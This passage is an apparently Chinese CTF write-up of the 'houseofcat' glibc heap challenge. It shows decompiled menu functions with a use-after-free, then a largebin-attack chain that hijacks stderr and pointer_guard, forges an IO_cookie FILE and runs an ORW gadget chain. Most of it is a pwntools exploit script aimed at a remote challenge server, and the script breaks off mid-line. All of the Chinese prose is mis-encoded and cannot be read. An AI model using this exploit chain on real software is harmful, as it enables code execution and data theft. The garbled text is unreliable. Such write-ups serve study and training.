cat</h2><p>å…ˆå¿½ç•¥é€†å‘é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹èœå•ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309251950662.png" alt="image-20230925195005578" style="zoom:50%;" /><p>add åŠŸèƒ½å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || *(&amp;heap + choice) )      <span class="comment">// æœ€å¤šç”³è¯·16ä¸ªå †å—</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;plz input your cat size:\n&quot;</span>);</span><br><span class="line">  size = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x417</span> || size &gt; <span class="number">0x46F</span> )          <span class="comment">// sizeå¤§å°åœ¨0x418~0x468</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid size!\n&quot;</span>);</span><br><span class="line">  *(&amp;heap + choice) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  <span class="keyword">if</span> ( !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">  heap_size[choice] = size;</span><br><span class="line">  print(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;heap + choice), heap_size[choice]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete åŠŸèƒ½å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &lt;= <span class="number">0xF</span> &amp;&amp; *(&amp;heap + choice) )</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heap + choice));                    <span class="comment">// UAFæ¼æ´</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show åŠŸèƒ½å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_188C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;Context:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, *(&amp;heap + choice), <span class="number">0x30</span>uLL);<span class="comment">//æ³„éœ²0x30å¤§å°ä¸”ä¸ä¼šè¢«\x00æˆªæ–­</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit åŠŸèƒ½å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( two_chance &lt;= <span class="number">0</span> )<span class="comment">//ä¸¤æ¬¡æœºä¼š</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;nonono!!!!\n&quot;</span>);</span><br><span class="line">  --two_chance;</span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;heap + choice), <span class="number">0x30</span>uLL);<span class="comment">//ä¿®æ”¹0x30å¤§å°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¯ä»¥è¿›è¡Œ largebin_attackï¼Œä¸”å…è®¸ä¸¤æ¬¡ã€‚</p><p>å¦å¤–é¢˜ç›®å¼€å¯äº†æ²™ç®±ï¼Œéœ€è¦ orwã€‚</p><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><ol><li>ç”³è¯·ä¸€ä¸ª 0x428 å¤§å°çš„ chunk0ï¼Œç”³è¯·å¦ä¸€ä¸ªå †é˜²æ­¢åˆå¹¶ã€‚</li><li>é‡Šæ”¾ chunk0 è¿›å…¥ unsorted_binã€‚</li><li>ç”³è¯·ä¸€ä¸ª 0x438 å¤§å°ï¼ˆ&gt;0x428ï¼‰çš„ chunk1ï¼Œchunk0 è¿›å…¥ large_binã€‚</li><li>ç”³è¯·ä¸€ä¸ª 0x418 å¤§å°çš„ chunk2ï¼Œç”³è¯·å¦ä¸€ä¸ªå †é˜²æ­¢åˆå¹¶ã€‚</li><li>é‡Šæ”¾ chunk2 è¿›å…¥ unsorted+binã€‚</li><li>ä¿®æ”¹ chunk0 çš„ bk_next ä¸º target-0x20ã€‚</li><li>ç”³è¯·ä¸€ä¸ª 0x438 å¤§å°çš„ chunk3ï¼Œtarget è¢«å†™å…¥ chunk2 çš„å†…å®¹ã€‚</li></ol><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><p>æ€è·¯ï¼šç”±äº stderr åœ¨ libc ä¸Šï¼Œå› æ­¤å¯ä»¥æ‰“ stderr+__malloc_assertï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ— æ³•æ­£å¸¸é€€å‡ºï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ”¹å° top_chunk è§¦å‘ __malloc_assertã€‚å¹¶ä¸”æˆ‘ä»¬è¿˜éœ€ç»•è¿‡æŒ‡é’ˆä¿æŠ¤ï¼Œä¿æŠ¤æŒ‡é’ˆçš„å€¼ä½äº fs[0x30] å³ pointer_guardï¼Œè¿™æ˜¯åœ¨ libc ä¸‹é¢çš„ä¸€å—ç©ºé—´ã€‚ï¼ˆubuntu2.35-0-3æ˜¯æœ‰çš„ï¼Œubuntu2.35-0-3.3å°±æ¯”è¾ƒå¥‡æ€ªï¼‰ </p><p>ç”±äºå¯ä»¥ç”³è¯·çš„å †å—åœ¨ 0x418~0x468ï¼Œå¹¶ä¸”å¯ä»¥ä¿®æ”¹ä¸¤æ¬¡ï¼Œåˆ©ç”¨ä¸€æ¬¡ largebin_attack åŠ«æŒ stderrï¼Œåˆ©ç”¨ä¸€æ¬¡ largebin_attack åŠ«æŒ pointer_guardï¼Œæœ€ååˆ©ç”¨ large_bin çš„ UAF æ„é€ å †é£æ°´ä¿®æ”¹ top_chunk çš„ sizeï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å †å—è§¦å‘ __malloc_attackã€‚</p><p>è¿™é‡Œå‚è€ƒ verfish å¸ˆå‚…çš„è„šæœ¬ï¼Œè¯´ä¸€ä¸‹å‡ ä¸ªé‡è¦çš„è¿‡ç¨‹ï¼š</p><ol><li>æ³„éœ² libc å’Œ heap åŸºå€ï¼Œå †å— 0 å…ˆè¿›å…¥ unsortedbinï¼Œåˆç”±äºç”³è¯·äº†æ›´å¤§çš„å †å—è¿›å…¥äº† largebinï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>å†å°† largebin ä¸­çš„å †å—ç”³è¯·å›æ¥ç”¨äºä¸‹ä¸€æ¬¡ largebin_attackï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>ç”³è¯·å­˜æ”¾ io_file çš„åå°å †å—ï¼Œæ­¤æ—¶éœ€è¦å°† io_file å†™å…¥ï¼Œå› ä¸º edit åªæœ‰ä¸¤æ¬¡æœºä¼šï¼Œä¸èƒ½æµªè´¹ï¼Œå¹¶é‡Šæ”¾ä¸€ä¸ªåå¤§å †å—è¿›å…¥ unsortedbinï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>, fake_file)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>å†ç”³è¯·ä¸€ä¸ªå¤§å †å—ï¼Œå¡«å…¥ orw é“¾å­ï¼Œæ­¤æ—¶unsortedbin ä¸­çš„åå¤§å †å—è¿›å…¥ largebinï¼Œå†ç”³è¯·ä¸€ä¸ªå †å—å¤‡ç”¨ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(13, 0x438, orw)</span><br><span class="line">add(12, 0x438, &#x27;verf1sh&#x27;)</span><br></pre></td></tr></table></figure><ol start="5"><li>é‡Šæ”¾æ‰å†…å®¹ä¸º fake_io_file çš„åå°å †å—ï¼Œä¿®æ”¹ largebin çš„ bk_next æŒ‡é’ˆæŒ‡å‘ stderr-0x20ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å †å—ï¼Œè¾¾æˆ large_bin_attackï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x458</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="6"><li>åŒç†ï¼Œä¿®æ”¹ fs[0x30] å³ pointer_guard ä¸ºä¸€ä¸ªå †åœ°å€ï¼š</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&#x27;pointer_guard-0x20 -&gt; &#123;&#125;&#x27;</span>.format(hex(pointer_guard<span class="number">-0x20</span>)))</span><br><span class="line">edit(<span class="number">15</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x860</span>) + p64(pointer_guard<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>åˆ©ç”¨ unsortedbin å’Œ topchunk åˆå¹¶çš„æ€§è´¨ï¼Œä¿®æ”¹ topchunk çš„ sizeï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x471</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x451</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x460</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>))</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252107432.png" alt="image-20230925210737374" style="zoom:50%;" /><ol start="8"><li>ç”³è¯·è¶…è¿‡ topchunk çš„ size å¤§å°çš„å †å—ï¼Œè§¦å‘ __malloc_assertã€‚</li></ol><p>æ¿å­å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x21ba60</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(io_cookie_jumps_addr+<span class="number">0x18</span>)</span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x450</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">enc_data =((gadget^(heap_base+<span class="number">0x1960</span>))&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((gadget^(heap_base+<span class="number">0x1960</span>))&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">fake_file += p64(enc_data)</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252128356.png" alt="image-20230925212843307" style="zoom:50%;" /><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252128354.png" alt="image-20230925212856312"></p><p>å…¶ä¸­ heap_base+0x1960 å³ä¿®æ”¹å pointer_guard çš„å€¼ï¼ˆä¸€ä¸ªå †åœ°å€ï¼‰ï¼Œå¸®åŠ©è§£å¯†æ‰§è¡Œ magicgadgetã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252131279.png" alt="image-20230925213120244" style="zoom:50%;" /><p>æœ€åè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./houseofcat&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;39.107.237.149&#x27;</span>, <span class="number">15255</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)#, &#x27;b *$rebase(0x181b)&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;LOGIN | r00t QWBQWXF admin&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;~\n&#x27;, payload)</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># add(2, 0x438, &#x27;verf1sh&#x27;)</span></span><br><span class="line"><span class="comment"># add(3, 0x420, &#x27;verf1sh&#x27;)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))<span class="comment">#&amp; 0xfffffffff000</span></span><br><span class="line">success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">flag_path = heap_base + <span class="number">0x440</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x278040</span></span><br><span class="line">stderr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8698</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">gadget = libc_base + <span class="number">0x00000000001675b0</span> </span><br><span class="line">io_cookie_jumps_addr = libc_base + <span class="number">0x215b80</span></span><br><span class="line">pointer_guard = libc_base - <span class="number">0x2890</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x21ba60</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(io_cookie_jumps_addr+<span class="number">0x18</span>)</span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x450</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">enc_data =((gadget^(heap_base+<span 